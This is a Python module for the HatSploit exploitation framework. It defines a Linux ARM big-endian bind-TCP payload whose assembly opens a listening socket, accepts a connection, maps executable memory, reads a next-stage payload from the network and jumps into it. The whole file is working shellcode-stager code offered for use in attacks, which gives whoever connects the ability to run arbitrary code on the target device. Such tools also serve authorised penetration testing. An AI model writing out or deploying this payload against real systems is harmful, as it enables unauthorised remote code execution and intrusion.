"""
This payload requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from hatsploit.lib.core.payload.basic import *


class HatSploitPayload(Payload, Handler):
    def __init__(self):
        super().__init__({
            'Name': "Linux armbe Bind TCP",
            'Payload': "linux/armbe/bind_tcp",
            'Authors': [
                "Ivan Nikolskiy (enty8080) - payload developer",
            ],
            'Description': (
                "This payload creates an interactive bind TCP connection for Linux "
                "with ARM big-endian architecture and reads next phase."
            ),
            'Arch': ARCH_ARMBE,
            'Platform': OS_LINUX,
            'Type': BIND_TCP,
        })

        self.reliable = BooleanOption('PhaseReliable', 'no', "Add error checks to payload.",
                                      False, advanced=True)
        self.length = IntegerOption('PhaseLength', None, "Length of next phase (empty to read length).",
                                    False, advanced=True)

    def run(self):
        assembly = """
        start:
            ldr r7, =281       
            mov r0, 2       
            mov r1, 1        
            mov r2, 6      
            svc 0
        """

        if self.reliable.value:
            assembly += """
                cmp r0, 0
                blt fail
            """

        assembly += """
            mov ip, r0
            add r7, 1
            adr r1, addr
            mov r2, 16
            svc 0
        """

        if self.reliable.value:
            assembly += """
                cmp r0, 0
                blt fail
            """

        assembly += """
            mov r0, ip
            mov r1, 2
            add r7, 2
            svc 0
        """

        if self.reliable.value:
            assembly += """
                cmp r0, 0
                blt fail
            """

        assembly += """
            mov r0, ip
            eor r1, r1
            eor r2, r2
            add r7, 1
            svc 0
        """

        if self.reliable.value:
            assembly += """
                cmp r0, 0
                blt fail
            """

        if self.length.value:
            assembly += f"""
                mov ip, r0
                sub sp, 4
                mov r0, {hex(self.length.value)}
                push {{r0}}
            """

        else:
            assembly += f"""
                mov ip, r0
                mov r0, ip
                sub sp, 4
                add r7, 8
                mov r1, sp
                mov r2, 4
                mov r3, 0
                svc 0
            """

        if self.reliable.value:
            assembly += """
                cmp r0, 0
                blt fail
            """

        assembly += """
            ldr r1, [sp, 0]
            ldr r3, =0xfffff000
            and r1, r1, r3
            mov r2, 1
            lsl r2, 12

            add r1, r2
            mov r7, 192
            ldr r0, =0xffffffff
            mov r2, 7
            ldr r3, =0x1022
            mov r4, r0
            mov r5, 0
            svc 0
        """

        if self.reliable.value:
            assembly += """
                cmn r0, 1
                beq fail
            """

        assembly += """
            add r7, 99
            mov r1, r0
            mov r3, 0

        loop:
            mov r0, ip
            ldr r2, [sp, 0]
            sub r2, 1000
            str r2, [sp, 0]
            cmp r2, 0
            ble break

            mov r2, 1000
            svc 0
        """

        if self.reliable.value:
            assembly += """
                cmp r0, 0
                blt fail
            """

        assembly += """
            b loop

        break:
            add r2, 1000
            svc 0
        """

        if self.reliable.value:
            assembly += """
                cmp r0, 0
                blt fail
            """

        assembly += """
            mov pc, r1
        """

        if self.reliable.value:
            assembly += """
            fail:
                mov r7, 1
                mov r0, 1
                svc 0
            """

        assembly += f"""
        addr:
            .short 0x2
            .short 0x{self.rport.big.hex()}
            .word 0x0
        """

        return self.assemble(assembly)
